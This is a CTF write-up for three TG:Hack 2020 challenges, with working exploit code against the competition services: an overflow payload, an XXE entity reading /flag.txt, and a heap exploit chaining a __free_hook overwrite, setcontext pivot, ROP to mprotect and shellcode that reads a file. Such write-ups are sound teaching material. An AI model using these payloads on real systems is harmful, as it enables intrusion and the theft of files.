# TG:Hack2020

>  Thu, 09 April 2020, 01:00 CST — Sun, 12 April 2020, 01:00 CST 

## Boofy (69pt)
### Description

> Author: [**Ingeborg Ytrehus - ingeborg_y#6548**](https://tghack.no/authors#16)
>
> This program looks like it's password protected, but we can't seem to find the correct password.
>
> ```
> nc boofy.tghack.no 6003
> ```
>
> or use a mirror closer to you:
>
> - `nc us.boofy.tghack.no 6003` (US)
> - `nc asia.boofy.tghack.no 6003` (Japan)
>
> files:
>
> - [download binary](https://storage.googleapis.com/tghack-public/2020/f93e424b7f8ce060b0c00dc135269128/boofy)
> - [download source](https://storage.googleapis.com/tghack-public/2020/f93e424b7f8ce060b0c00dc135269128/boofy.c)

### Analysis

It's a really easy task. The codes `gets(password)` will overflow the buffer and we can get flag by overwrite `correct` to `\x01`.

```c
void try_password(){
    char password[20] = { 0 };
    int correct = 0;    
    printf("Please enter the password?\n");
    gets(password);
    if (correct == 1) {
        get_flag();
    } else {
        printf("Sorry, but that's not the right password...\n");
    }
}
```

### Solution

```python
offset = 21
payload = '\x01'*offset
sl(payload)
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/TG:HACK2020/pwn/boofy) 



## Extract this! (93pt)
### Description

> Extract This!
>
> Author: Einar Antonsen - Chabz#1587
>
> One of our agents managed to install a service on MOTHER's network. We can use it to extract secrets, but she didn't tell me how! Can you figure it out?
>
> ```
> nc extract.tghack.no 6000
> ```
>

### Analysis

It's a xml language parser, so try to [XEE(**X**ML **E**xternal **E**ntity)](https://en.wikipedia.org/wiki/XML_external_entity_attack) Injection.

### Solution

```xml
<?xml version="1.0" encoding="UTF-8" ?> <!DOCTYPE ANY [<!ENTITY xxe SYSTEM "/flag.txt" >]><value>&xxe;</value>
```

>  Is it a really pwn instead of web challenges?



## crap (319pt)

so difficult...

~~I success in local but fail in remote...~~

### seccomp rules

```nasm
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x12 0xc000003e  if (A != ARCH_X86_64) goto 0020
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0f 0xffffffff  if (A != 0xffffffff) goto 0020
 0005: 0x15 0x0d 0x00 0x00000002  if (A == open) goto 0019
 0006: 0x15 0x0c 0x00 0x00000003  if (A == close) goto 0019
 0007: 0x15 0x0b 0x00 0x0000000a  if (A == mprotect) goto 0019
 0008: 0x15 0x0a 0x00 0x000000e7  if (A == exit_group) goto 0019
 0009: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0014
 0010: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # read(fd, buf, count)
 0011: 0x15 0x00 0x08 0x00000000  if (A != 0x0) goto 0020
 0012: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
 0013: 0x15 0x05 0x06 0x00000000  if (A == 0x0) goto 0019 else goto 0020
 0014: 0x15 0x00 0x05 0x00000001  if (A != write) goto 0020
 0015: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # write(fd, buf, count)
 0016: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0020
 0017: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)
 0018: 0x15 0x00 0x01 0x00000001  if (A != 0x1) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x06 0x00 0x00 0x00000000  return KILL

```

### Solution

> ~~Note: Only works in local~~ 
>
> ~~Ubuntu 19.04 & libc 2.29~~ (now it works in both local and remote)

1. leak `main_arean` by printing `feedback` after free 

   ```python
   sla('> ','3')
   sla('feedback: ','%15$p'.ljust(8,'a')+ropchain)
   sla('Do you want to keep your feedback? (y/n)\n','n')
   stack = eval(rc(14))
   ```

2. leak the base of `text` ~~by searching the value of text base address in library `ld` .~~

    > the offset between libc and ld does not change (in local)
    >
    > but the offset in local is different from it in remote
    
    by following operation:

    ```c
    pwndbg> search -8 stdin
    crap_debug      0x5599c0c26020 0x7f2953aff980
    libc.so.6       0x7f2953afef90 0x7f2953aff980
    libc.so.6       0x7f2953b00708 0x7f2953aff980
    libc.so.6       0x7f2953b00790 0x7f2953aff980
    [stack]         0x7fff6047bda8 0x7f2953aff980
    [stack]         0x7fff6047bdd8 0x7f2953aff980
    [stack]         0x7fff6047be00 0x7f2953aff980
    [stack]         0x7fff6047be58 0x7f2953aff980
    pwndbg> search -8 0x5599c0c26020
    libc.so.6       0x7f2953afefc0 0x5599c0c26020
    pwndbg> p/x 0x7f2953afefc0-0x7f295374a000
    $3 = 0x3b4fc0
    ```

    >  Unbelievable! There is a ptr in `libc` point to `stdin` in `bss`

    ```python
    stdin = libcbase+0x3b4fc0 
    text = stdin - 0x202020
    ```

    > `bss:0000000000202020 ; FILE *stdin `

    we can get base of text by leaking `stdin` in .`bss`!!!!!!

    > Thanks my friend *binLep* told me this amazing thing :D

3. overwrite `write_count`,`read_count` to negative number and clean `feedback` 

    ```python
    main = text + 0x1180
    write_count = text+write_count_off
    feedback = write_count+4
    read_count = write_count-4
    sla('> ','2')
    sla('addr/value: ','%s %s'%(hex(read_count),hex(0xffffffdfffffffdf)))
    sla('> ','2')
    sla('addr/value: ','%s %s'%(hex(feedback),hex(0)))
    ```

4. overwrite `__free_hook` so we can control `rip` after `feedback` was freed

    ```python
    sla('> ','2')
    sla('addr/value: ','%s %s'%(hex(free_hook),hex(printf)))
    ```

5. put `ropchain` and `shellcode` into `feedback` (in heap)

    ```python
    sla('> ','3')
    sla('feedback: ','%15$p'.ljust(8,'a')+ropchain)
    sla('Do you want to keep your feedback? (y/n)\n','n')
    ```

6. trigger rop by overwriting `__free_hook` to  `setcontext` 

    ```nasm
    <setcontext+53>:  mov    rsp,QWORD PTR [rdx+0xa0]
    <setcontext+60>:  mov    rbx,QWORD PTR [rdx+0x80]
    <setcontext+67>:  mov    rbp,QWORD PTR [rdx+0x78]
    <setcontext+71>:  mov    r12,QWORD PTR [rdx+0x48]
    <setcontext+75>:  mov    r13,QWORD PTR [rdx+0x50]
    <setcontext+79>:  mov    r14,QWORD PTR [rdx+0x58]
    <setcontext+83>:  mov    r15,QWORD PTR [rdx+0x60]
    <setcontext+87>:  mov    rcx,QWORD PTR [rdx+0xa8]
    <setcontext+94>:  push   rcx
    <setcontext+95>:  mov    rsi,QWORD PTR [rdx+0x70]
    <setcontext+99>:  mov    rdi,QWORD PTR [rdx+0x68]
    <setcontext+103>: mov    rcx,QWORD PTR [rdx+0x98]
    <setcontext+110>: mov    r8,QWORD PTR [rdx+0x28]
    <setcontext+114>: mov    r9,QWORD PTR [rdx+0x30]
    <setcontext+118>: mov    rdx,QWORD PTR [rdx+0x88]
    <setcontext+125>: xor    eax,eax
    <setcontext+127>: ret    
    ```

    > all regs can be assigned by `setcontext`

    ```python
    free_hook = libcbase+libc.sym['__free_hook']
    setcontext = libcbase+0x45ba5
    sla('> ','2')
    sla('addr/value: ','%s %s'%(hex(feedback),hex(0)))
    sla('> ','2')
    sla('addr/value: ','%s %s'%(hex(free_hook),hex(setcontext)))
    # config setcontext
    rsp = libcbase+0x3b5aa4
    rcx = libcbase+0x3b5aac
    sla('> ','2')
    sla('addr/value: ','%s %s'%(hex(rsp),hex(buf)))
    sla('> ','2')
    sla('addr/value: ','%s %s'%(hex(rcx),hex(prdi)))
    sla('> ','3')
    # trigger free
    sla('feedback: ',p64(0xdeadbeef)*10)
    # debug('b free')
    sla('Do you want to keep your feedback? (y/n)\n','n')
    ```

7. call `mprotect` to make `heap` executable

    ```python
    ropchain = p64(prdi) + p64(heap) + p64(prsi) + p64(0x10000) + p64(prdx) + p64(0x7) + p64(mprotect)
    ```

    ![](http://image.taqini.space/img/20200414004117.png)

8. `close(0)` to release `fd0` and open `flag` , `fd0` would be assigned to the flag file

    ```python
    ropchain += p64(buf+0x40+8)
    ropchain += asm('''
                /* close(0) */\n
                xor edi, edi /* 0 */\n
                push SYS_close /* 3 */\n
                pop rax\n
                syscall\n
    
                /* open(flag) */\n
                push 0x1010101 ^ 0x747874\n
                xor dword ptr [rsp], 0x1010101\n
                mov rax, 0x2e67616c662f7061\n
                push rax\n
                mov rax, 0x72632f656d6f682f\n
                push rax\n
                mov rdi, rsp\n
                xor edx, edx\n
                mov dh, 0x100 >> 8\n
                xor esi, esi /* 0 */\n
                push SYS_open /* 2 */\n
                pop rax\n
                syscall\n
    
                /* call read(0,buf,0x40) */\n
                mov rdi,rax\n
                mov rsi,%s\n
                push 0x40\n
                pop rdx\n
                push 0x0\n
                pop rcx\n
                push 0\n
                pop rax\n
                syscall\n
    
                /* call write(1,buf,0x40) */\n
                push 1\r\n
                pop rdi\n
                mov rsi,%s\n
                push 0x40\n
                pop rdx\n
                push 0x0\n
                pop rcx\n
                push 1\n
                pop rax\n
                syscall\n
        '''%(buf+0x100,buf+0x100)
        )
    ```

9. read flag and write it

10. ~~too lazy to say any more ... and so poor python exp I was written...~~ [exp](https://github.com/TaQini/ctf/tree/master/TG:HACK2020/pwn/crap) 

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/TG:HACK2020/pwn/crap) 

> now this challenge is online @ [ctf.taqini.space](http://ctf.taqini.space)

```shell
nc ctf.taqini.space 10111
```

### Other wp
[wp of Will's Root](ctf/TGHACK-2020/wp_of_Will)

### Great artical
[Pivoting Around Memory](https://nickgregory.me/security/2019/04/06/pivoting-around-memory/)
